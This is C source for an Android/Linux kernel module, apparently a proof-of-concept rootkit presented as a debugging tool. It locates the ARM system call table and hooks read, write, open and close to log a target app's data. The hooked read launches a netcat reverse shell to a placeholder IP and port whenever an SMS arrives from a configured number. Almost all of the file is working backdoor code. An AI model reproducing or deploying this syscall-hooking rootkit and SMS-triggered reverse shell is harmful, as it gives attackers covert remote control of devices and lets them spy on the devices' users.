/* LKM - debug_evt
   Author: Sebastián Guerrero <0xroot> <s.guerrero0@gmail.com>

   For further information: http://blog.seguesec.com/2013/01/544/ (1) (Spanish)
*/

#include <asm/unistd.h> 
#include <linux/autoconf.h> 
#include <linux/in.h> 
#include <linux/init_task.h> 
#include <linux/ip.h> 
#include <linux/kernel.h> 
#include <linux/kmod.h> 
#include <linux/mm.h> 
#include <linux/module.h> 
#include <linux/sched.h> 
#include <linux/skbuff.h> 
#include <linux/stddef.h> 
#include <linux/string.h> 
#include <linux/syscalls.h> 
#include <linux/tcp.h> 
#include <linux/types.h> 
#include <linux/unistd.h> 
#include <linux/version.h> 
#include <linux/workqueue.h>

void vector_table();
void vector_swi();
unsigned long * syscall_table();

// Original syscalls
asmlinkage ssize_t (*syscall_read) (int fd, char *buf, size_t count);
asmlinkage ssize_t (*syscall_write) (int fd, char *buf, size_t count);
asmlinkage ssize_t (*syscall_open) (const char *pathname, int flags);
asmlinkage ssize_t (*syscall_close) (int fd);
asmlinkage int (*getuid_call)();

static int appUID = NULL;

module_param(appUID, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
MODULE_PARM_DESC(appUID, "Application's UID");

static int revshell(void) {
  char *argv[] = { "/system/bin/nc", "YOUR IP", "YOUR PORT", "-e",  "/system/bin/sh",  NULL };		// CHANGE THIS LINE
  static char *envp[] =  { 
      "HOME=/", 
      "PATH=/sbin:/system/sbin:/system/bin:/system/xbin", NULL };
  printk(KERN_INFO "\nAccess shell granted....\n");
  call_usermodehelper (argv[0], argv, envp, 1);
}

// Hooked syscalls

asmlinkage ssize_t hooked_syscall_read(int fd, char *buf, size_t count) {
	//printk (KERN_INFO "HOOKED SYS_READ: %s\n", buf);

	if(strstr (buf, "getSmsNewMessageNotificationInfo")) {
			if(strstr(buf, "addr=YOUR NUMBER")) // CHANGE THIS LINE
				revshell();
	}
	else {
		uid_t gtuid;
		gtuid = getuid_call();
		
		if(gtuid == appUID)
				printk("----------->DEBUG APP uid = %d - SYS_READ_HOOK: %s\n", gtuid, buf);

		return syscall_read(fd, buf, count);
	}
	return syscall_read(fd, buf, count);
}

asmlinkage ssize_t hooked_syscall_write(int fd, char *buf, size_t count) {
	uid_t gtuid;
	gtuid = getuid_call();

	if(gtuid == appUID)
		printk("----------->DEBUG APP uid = %d - SYS_WRITE_HOOK: %s\n", gtuid, buf);

	return syscall_write(fd, buf, count);
}

asmlinkage ssize_t hooked_syscall_open(const char *pathname, int flags) {
	uid_t gtuid;
	gtuid = getuid_call();
	
	if(gtuid == appUID)
		printk("----------->DEBUG APP uid = %d - SYS_OPEN_HOOK: %s\n", gtuid, pathname);

	return syscall_open(pathname, flags);
}

asmlinkage ssize_t hooked_syscall_close(int fd) {
	uid_t gtuid;
	gtuid = getuid_call();
	
	if(gtuid == appUID)
		printk("----------->DEBUG APP uid = %d - SYS_CLOSE_HOOK: %s\n", gtuid, current->comm);

	return syscall_close(fd);
}

/*
	Show EVT's content
*/
void vector_table(){
	unsigned long* vector_table_address = 0xFFFF0000;
	unsigned long vector_table_instruction;
	while(vector_table_address != 0xFFFF1000) {
		memcpy(&vector_table_instruction, vector_table_address, sizeof(vector_table_instruction));
		printk(KERN_INFO "--> DEBUG: Vector Table Address: %lx, Vector Table Instruction; %lx\n", vector_table_address, vector_table_instruction);
		vector_table_address += 1;
	}
}

/*
	Show Vector Software Handler Interrupt's content
*/
void vector_swi() {
	unsigned long *swi_address = 0xFFFF0008;
	unsigned long vector_swi_offset = 0;
	unsigned long vector_swi_instruction = 0;
	unsigned long *vector_swi_pointer = NULL;
	unsigned long *ptr = NULL;


	memcpy(&vector_swi_instruction, swi_address, sizeof(vector_swi_instruction));
	printk(KERN_INFO "--->DEBUG: Vector SWI Instruction: %lx\n", vector_swi_instruction);

	vector_swi_offset = vector_swi_instruction & (unsigned long)0x00000FFF;
	printk(KERN_INFO "--->DEBUG: Vector SWI Offset: 0x%lx\n", vector_swi_offset);

	vector_swi_pointer = (unsigned long *)((unsigned long)swi_address+vector_swi_offset+8);
	printk(KERN_INFO "--->DEBUG: Vector SWI Address Pointer %p, Value: %lx\n", vector_swi_pointer, *vector_swi_pointer);

	ptr = *vector_swi_pointer;
	
	printk(KERN_INFO "---------->DEBUG: Vector SWI Handler\n");
	while(ptr != 0xc0026fb4) {
		memcpy(&vector_swi_instruction, ptr, sizeof(vector_swi_instruction));
		printk(KERN_INFO "--->DEBUG: Vector SWI Address Pointer %p, Value: %lx\n", ptr, *ptr);
		ptr++;
	}

	memcpy(&vector_swi_instruction, ptr, sizeof(vector_swi_instruction));
	printk(KERN_INFO "--->DEBUG: Vector SWI Address Pointer %p, Value: %lx\n", ptr, *ptr);
}

/*
	Get the sys_call_table address
*/
unsigned long* syscall_table() {
	unsigned long *swi_address = 0xFFFF0008;
	unsigned long vector_swi_offset = 0;
	unsigned long vector_swi_instruction = 0;
	unsigned long *vector_swi_pointer = NULL;
	unsigned long *ptr = NULL;
	unsigned long *syscall = NULL;
    unsigned long syscall_table_offset = 0;

	memcpy(&vector_swi_instruction, swi_address, sizeof(vector_swi_instruction));
	printk(KERN_INFO "--->DEBUG: Vector SWI Instruction: %lx\n", vector_swi_instruction);

	vector_swi_offset = vector_swi_instruction & (unsigned long)0x00000FFF;
	printk(KERN_INFO "--->DEBUG: Vector SWI Offset: 0x%lx\n", vector_swi_offset);

	vector_swi_pointer = (unsigned long *)((unsigned long)swi_address+vector_swi_offset+8);
	printk(KERN_INFO "--->DEBUG: Vector SWI Address Pointer %p, Value: %lx\n", vector_swi_pointer, *vector_swi_pointer);

	ptr = *vector_swi_pointer;
	
	while(syscall == NULL) {
		if((*ptr & (unsigned long)0xFFFFFF000) == 0xE28F8000) {
			syscall_table_offset = *ptr & (unsigned long)0x00000FFF;
			syscall = (unsigned long)ptr+8+syscall_table_offset;
			printk(KERN_INFO "--->DEBUG: Syscall Table Found at %p\n", syscall);
			break;
		}
		ptr++;
	}
	return syscall;
}

// Our initial module
static int __init debug_start() {
	printk(KERN_INFO "---> Loading Module\n");
	printk(KERN_INFO "---> Done.\n");
	//vector_table();							// For debugging purposes (1)
	//vector_swi();								// For debugging purposes (1)
	unsigned long * syscall = syscall_table();
	
	syscall_read = syscall[__NR_read];			// Hook sys_read
	syscall[__NR_read] = hooked_syscall_read;
	getuid_call = syscall[__NR_getuid];

	syscall_write = syscall[__NR_write];		// Hoook sys_write
	syscall[__NR_write] = hooked_syscall_write;

	syscall_open = syscall[__NR_open];			// Hook sys_open
	syscall[__NR_open] = hooked_syscall_open;

	syscall_close = syscall[__NR_close];		// Hook sys_close
	syscall[__NR_close] = hooked_syscall_close;

	return 0;
}

static int __exit debug_stop() {
	printk(KERN_INFO "---> (Debug stop) Getting syscall table address\n");
	unsigned long * syscall = syscall_table();

	// Restoring the original syscalls
	printk(KERN_INFO "---> (Debug stop) Restoring original syscalls\n");
	syscall[__NR_read] = syscall_read;
	syscall[__NR_write] = syscall_write;
	syscall[__NR_open] = syscall_open;
	syscall[__NR_close] = syscall_close;
	syscall[__NR_getuid] = getuid_call;
}

module_init (debug_start);
module_exit (debug_stop);
